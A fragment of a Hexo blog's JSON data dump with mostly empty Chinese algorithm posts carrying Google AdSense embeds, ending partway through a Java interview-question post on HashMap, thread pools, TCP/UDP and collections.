src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-概率统计","published":1,"updated":"2019-09-17T08:29:22.464Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2hp0032o25t88dp4vhd","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-深度和广度优先搜索","date":"2019-09-17T08:25:07.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-深度和广度优先搜索.md","raw":"---\ntitle: 算法-深度和广度优先搜索\ndate: 2019-09-17 16:25:07\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-深度和广度优先搜索","published":1,"updated":"2019-09-17T08:25:07.992Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2hq0034o25txrbfi4wq","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-算法实战一","date":"2019-09-17T08:31:59.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-算法实战一.md","raw":"---\ntitle: 算法-算法实战一\ndate: 2019-09-17 16:31:59\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-算法实战一","published":1,"updated":"2019-09-17T08:31:59.129Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2hr0037o25tbybtt3gy","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-算法实战三","date":"2019-09-17T08:32:06.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-算法实战三.md","raw":"---\ntitle: 算法-算法实战三\ndate: 2019-09-17 16:32:06\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-算法实战三","published":1,"updated":"2019-09-17T08:32:06.645Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2hs0038o25tz3wpihjs","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-算法实战二","date":"2019-09-17T08:32:03.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-算法实战二.md","raw":"---\ntitle: 算法-算法实战二\ndate: 2019-09-17 16:32:03\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-算法实战二","published":1,"updated":"2019-09-17T08:32:03.051Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2ht0039o25ttp7v78d4","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-算法实战五","date":"2019-09-17T08:32:17.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-算法实战五.md","raw":"---\ntitle: 算法-算法实战五\ndate: 2019-09-17 16:32:17\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-算法实战五","published":1,"updated":"2019-09-17T08:32:17.189Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2hu003bo25t8pfebv7o","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-算法实战四","date":"2019-09-17T08:32:10.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-算法实战四.md","raw":"---\ntitle: 算法-算法实战四\ndate: 2019-09-17 16:32:10\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-算法实战四","published":1,"updated":"2019-09-17T08:32:10.905Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2hu003co25tp049ng3n","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-索引","date":"2019-09-17T08:30:15.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-索引.md","raw":"---\ntitle: 算法-索引\ndate: 2019-09-17 16:30:15\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-索引","published":1,"updated":"2019-09-17T08:30:16.005Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2hw003eo25tmeobzmld","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-红黑树（下）","date":"2019-09-17T08:23:59.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-红黑树（下）.md","raw":"---\ntitle: 算法-红黑树（下）\ndate: 2019-09-17 16:23:59\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-红黑树（下）","published":1,"updated":"2019-09-17T08:23:59.676Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2hx003go25teas0fgvp","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-红黑树（上）","date":"2019-09-17T08:23:55.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-红黑树（上）.md","raw":"---\ntitle: 算法-红黑树（上）\ndate: 2019-09-17 16:23:55\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-红黑树（上）","published":1,"updated":"2019-09-17T08:23:55.407Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2hy003jo25tojzxnv1e","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-贪心算法","date":"2019-09-17T08:26:13.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-贪心算法.md","raw":"---\ntitle: 算法-贪心算法\ndate: 2019-09-17 16:26:13\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-贪心算法","published":1,"updated":"2019-09-17T08:26:13.365Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2hy003lo25t4vfpan55","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-递归树","date":"2019-09-17T08:24:24.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-递归树.md","raw":"---\ntitle: 算法-递归树\ndate: 2019-09-17 16:24:24\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-递归树","published":1,"updated":"2019-09-17T08:24:24.877Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2hz003oo25t07fa5rgv","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"Java面试题","date":"2018-11-02T03:18:14.000Z","_content":"\n#### 1、HashMap和HashTable区别\nHashMap是HashTable的轻量实现（非线程安全），他们都实现的Map接口，主要区别在于：线程安全，同步，性能\n\n* HashTable继承Dictionary，HashMap继承的是java2出现的Map接口；\n* HashMap允许将null作为key或value，hashtable不允许；\n* HashMap是非同步的，HashTable是同步的(synchronized),所以HashMap线程不安全，而HashTable是线程安全的，多个线程可以共享一个HashTbale而不需要为自己的方法实现同步。Java5提供了ConcurrentMap，用来替代HashTable，比HashTable扩展性好；\n* 由于HashMap是非线程安全的，所以单一线程访问，HashMap性能要高于HashTable；\n* HashMap的迭代器（Iterator）是fail-fast迭代器，HashTable的enumerator迭代器不是fail-fast的。\n* HashMap把HashTable的contains方法去掉了，换成了containsValue和containsKey\n* HashTable中数组默认大小是11，扩容方法是old\\*2+1;HashMap默认大小是16，扩容每次为2的指数大小\n\n#### 2、Object的hashcode方法，equals方法，常用的地方\n\n#### 3、HashMap的原理应用场景\n\n简单的说，HashMap是由数组和链表组成的，主体是数组，链表的作用主要是为了解决哈希冲突而存在的。在JDK1.8之后，链表长度超过8之后，会转换为红黑树。HashMap的默认容量为16，阈值为0.75，总容量超过0.75时，会进行2倍扩容。\n\n#### 4、JDK中有哪些线程池\n\nJava中通过Executors提供四种线程池：\n* newCachedTheadPool： 创建一个可缓存的线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无回收，则创建线程。此线程池不会对线程池大小做限制，线程池大小完全依赖系统能够创建的最大线程大小。\n* newFixedThreadPool： 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待\n* newScheduleThreadPool： 创建一个定长线程池，支持定时及周期性任务执行\n* newSingleThreadExecutor： 创建一个单线程化的线程池，他只会用唯一的工作线程来执行任务，保证所有任务按照先定顺序（FIFO，LIFO优先级执行）\n\n#### 5、TCP/UDP区别\n\n**相同点**： 都处于OSI七层模型的网络层，都是传输层协议，都能保护网络层的传输，双方通信都需要开放端口。\n\n| \t|               TCP \t\t\t\t\t  |                UDP   \t\t\t\t|\n|---|-----------------------------------------|-------------------------------------|\n|1\t|Transmission Control Protocol 传输控制协议| User Data Protocol 用户数据报协议 \t| \n|2\t|TCP的传输是可靠传输\t\t\t\t\t\t  | UDP的传输是不可靠传输               \t|\n|3  |TCP是基于连接的协议，在正式收发数据前，必须和对方建立可靠的连接|UDP是和TCP相对应的协议，他是面向非连接的协议，他不与对方建立连接，而是直接把数据包发送出去|\n|4  |TCP是一种可靠的通信服务，负载相对而言比较大，TCP用套接字(socket)或者端口进行通信|UDP是一种不可靠的网络服务，负载相对较小|\n|5  |TCP和UP的结构不同，TCP包括序号、确认信号、数据偏移、控制标志(通常URG、ACK、PSH、RST、SYN、FIN)、窗口、检验和、紧急指针、选项等信息|UDP包含长度和检验和信息|\n|6  |TCP提供超时重发，丢弃重复数据，检验数据，流量控制等，保证数据从一端传到另一端 |UDP不提供可靠性，他只是把应用程序传给IP层的数据发送出去，但是不能保证他们到达目的端|\n|7  |TCP发送数据包前会在通信双方间建立三次握手，确保双方准备好，在传输数据包期间，TCP会根据链路中数据流量的大小来调节传送的速率，传输时如果发现有丢包，会有严格的重传机制，故而传输速度很慢|UDP在传输数据报前不用在客户端和服务器之间建立连接，且没有超时重发机制，故而传输速度很快|\n|8  |TCP支持全双工和并发的TCP连接，提供确认、重传、拥塞控制|UDP适用于对系统性能要求高于数据完整性的要求，需要简短快捷的数据交换、需要多播和广播的应用环境|\n\n\n#### 6、查找一个数组的中位数\n\n#### 7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。\n\n#### 8、Object类中的方法\n\n#### 9、对象比较是否相等\n\n#### 10、toString方法的常用地方，为什么要重写该方法\n\n#### 11、HashMap put方法怎么判断是否是重复方法\n\n#### 12、Set和List的区别\n\n#### 13、ArrayList和LinkedList的区别，List和Map的区别， ArrayList和Vector的区别\n\n* ArrayList和LinkedList区别：\n\t* ArrayList内部是基于数组实现的，因此对于随机访问快，新增删除慢\n\t* LinkedList内部是基于链表实现的，因此新增删除快，随机访问慢。\n* List和Map的区别：\n\t* List是存储单列数据的集合，存储的数据都是有序并且是可以重复的\n\t* Map是存储双列数据的集合，通过键值对存储数据，存储的数据是无序的，Key值不能重复，value值是可以重复的。\n* ArrayList和Vector的区别：\n\t* 